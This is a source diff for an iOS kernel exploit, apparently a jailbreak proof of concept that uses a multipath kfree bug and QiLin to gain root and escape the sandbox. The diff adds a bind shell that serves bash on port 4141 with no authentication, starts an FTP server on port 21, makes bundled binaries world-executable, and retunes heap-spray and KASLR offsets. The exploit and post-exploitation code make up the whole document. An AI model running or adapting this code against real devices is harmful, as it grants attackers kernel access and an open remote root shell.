@@ -11,7 +11,7 @@
 #include "extra_recipe_utils.h"
 #include "multipath_kfree.h"
 #include "QiLin.h"
-
+#include "pureftpd.h"
 
 #include <sys/socket.h>
 #include <sys/mman.h>
@@ -21,7 +21,12 @@
 #include <string.h>
 #include <unistd.h>
 #include <pthread.h>
-
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <spawn.h>
+#include <dirent.h>
+#include <CoreFoundation/CoreFoundation.h>
+#include <sys/stat.h>
 
 uint64_t kernel_base = 0;
 
@@ -34,7 +39,144 @@ uint64_t kernel_base = 0;
 #define REFILL_PORTS_COUNT 100
 #define TOOLAZY_PORTS_COUNT 1000
 #define REFILL_USERCLIENTS_COUNT 1000
-#define MAX_PEEKS 90000
+#define MAX_PEEKS 30000
+char* bundle_path() {
+    CFBundleRef mainBundle = CFBundleGetMainBundle();
+    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
+    int len = 4096;
+    char* path = malloc(len);
+    
+    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
+    
+    return path;
+}
+
+char* prepare_directory(char* dir_path) {
+    DIR *dp;
+    struct dirent *ep;
+    
+    char* in_path = NULL;
+    char* bundle_root = bundle_path();
+    asprintf(&in_path, "%s/iosbinpack64/%s", bundle_root, dir_path);
+    
+    
+    dp = opendir(in_path);
+    if (dp == NULL) {
+        printf("unable to open payload directory: %s\n", in_path);
+        return NULL;
+    }
+    
+    while ((ep = readdir(dp))) {
+        char* entry = ep->d_name;
+        char* full_entry_path = NULL;
+        asprintf(&full_entry_path, "%s/iosbinpack64/%s/%s", bundle_root, dir_path, entry);
+        
+        printf("preparing: %s\n", full_entry_path);
+        
+        // make that executable:
+        int chmod_err = chmod(full_entry_path, 0777);
+        if (chmod_err != 0){
+            printf("chmod failed\n");
+        }
+        
+        free(full_entry_path);
+    }
+    
+    closedir(dp);
+    free(bundle_root);
+    
+    return in_path;
+}
+
+// prepare all the payload binaries under the iosbinpack64 directory
+// and build up the PATH
+char* prepare_payload() {
+    char* path = calloc(4096, 1);
+    strcpy(path, "PATH=");
+    char* dir;
+    dir = prepare_directory("bin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("sbin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("usr/bin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("usr/local/bin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("usr/sbin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    strcat(path, "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec");
+    
+    return path;
+}
+
+void do_bind_shell(char* env, int port) {
+    char* bundle_root = bundle_path();
+    
+    char* shell_path = NULL;
+    asprintf(&shell_path, "%s/iosbinpack64/bin/bash", bundle_root);
+    
+    char* argv[] = {shell_path, NULL};
+    char* envp[] = {env, NULL};
+    
+    struct sockaddr_in sa;
+    sa.sin_len = 0;
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(port);
+    sa.sin_addr.s_addr = INADDR_ANY;
+    
+    int sock = socket(PF_INET, SOCK_STREAM, 0);
+    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
+    listen(sock, 1);
+    
+    printf("shell listening on port %d\n", port);
+    
+    for(;;) {
+        int conn = accept(sock, 0, 0);
+        
+        posix_spawn_file_actions_t actions;
+        
+        posix_spawn_file_actions_init(&actions);
+        posix_spawn_file_actions_adddup2(&actions, conn, 0);
+        posix_spawn_file_actions_adddup2(&actions, conn, 1);
+        posix_spawn_file_actions_adddup2(&actions, conn, 2);
+        
+        
+        pid_t spawned_pid = 0;
+        int spawn_err = posix_spawn(&spawned_pid, shell_path, &actions, NULL, argv, envp);
+        
+        if (spawn_err != 0){
+            perror("shell spawn error");
+        } else {
+            printf("shell posix_spawn success!\n");
+        }
+        
+        posix_spawn_file_actions_destroy(&actions);
+        
+        printf("our pid: %d\n", getpid());
+        printf("spawned_pid: %d\n", spawned_pid);
+        
+        int wl = 0;
+        while (waitpid(spawned_pid, &wl, 0) == -1 && errno == EINTR);
+    }
+    
+    free(shell_path);
+}
+
 
 typedef struct alloc_asid_arg {
     int max_asid;
@@ -48,13 +190,14 @@ void* alloc_asid(void* arg) {
 }
 
 void panic_now() {
-    pthread_t thread;
-    pthread_attr_t attr;
-    pthread_attr_init(&attr);
+    
     int max_asid = 65536;
     int max_attempts = 1000;
     alloc_asid_arg arg = { max_asid };
     for(int attempts = 0; attempts < max_attempts; attempts++) {
+        pthread_t thread;
+        pthread_attr_t attr;
+        pthread_attr_init(&attr);
         pthread_create(&thread, &attr, &alloc_asid, &arg);
     }
 }
@@ -131,12 +274,24 @@ void post_exploitation(uint64_t kernel_base, uint64_t kaslr_shift)
     // Use Jonathan Levin's QiLin to elevate prvileges and escape sandbox.
     
     _init_tfp0less_qilin(kaslr_shift);
+    
     initQiLin(0x1337, kernel_base);
     
     rootifyMe();
     ShaiHuludMe(0);
     
+    
     printf("If all went well, sandbox escaped and root achieved now, test it if you want\n");
+    
+    printf("Connect back, make sure you was nc -l 8061");
+    char* env_path = prepare_payload();
+    printf("will launch a shell with this environment: %s\n", env_path);
+    char* args[] = {0};
+    pureftpd_start(0,args, "/", 21);
+    do_bind_shell(env_path, 4141);
+    
+    free(env_path);
+    
 }
 
 void jb_go(void)
@@ -153,7 +308,7 @@ void jb_go(void)
     uint8_t send_buf[1024];
     
     int mp_socks[MP_SOCK_COUNT];
-    int prealloc_size = 0x1000; // kalloc.4096
+    int prealloc_size = 0x660; // kalloc.4096
     int found = 0;
     int peeks = 0;
     
@@ -183,8 +338,10 @@ void jb_go(void)
     }
     
     printf("Freeing the stuff...\n");
+    
     multipath_kfree_nearby_self(mp_socks[0], 0x0000 + 0x7a0);
     multipath_kfree_nearby_self(mp_socks[3], 0xe000 + 0x7a0);
+    
     for (peeks = 0; peeks < MAX_PEEKS; ++peeks) {
         for (int i = 0 ; i < FIRST_PORTS_COUNT; ++i) {
             if (_is_port_corrupt(first_ports[i])) {
@@ -202,10 +359,8 @@ void jb_go(void)
     if (peeks >= MAX_PEEKS) {
         printf("Didn't find corrupt port");
         sleep(1);
-        for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
-            mach_port_destroy(mach_task_self(), first_ports[i]);
-        }
         panic_now();
+        exit(0);
     }
     
     
@@ -240,9 +395,9 @@ void jb_go(void)
     recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
     
     uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
-    uint64_t kaslr_shift = vtable - 0xfffffff006fdd978;
+    uint64_t kaslr_shift = vtable - offsets.AGXCommandQueue_vtable ;
     printf("AGXCommandQueue vtable: %p\n", (void *)vtable);
-    printf("kaslr shift: %p\n", (void *)kaslr_shift);
+    printf("kaslr shift: %p\n", (void*)kaslr_shift);
     
     // Out of everything not done properly in this POC, this is
     // not done properly the most
@@ -250,6 +405,7 @@ void jb_go(void)
     for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
         toolazy_ports[i] = prealloc_port(prealloc_size-0x28); // Not even really aligned because lazy
     }
+    
     printf("Getting kernel r/w access...\n");
     kx_setup(refill_userclients, toolazy_ports, kaslr_shift, contained_port_addr);
     
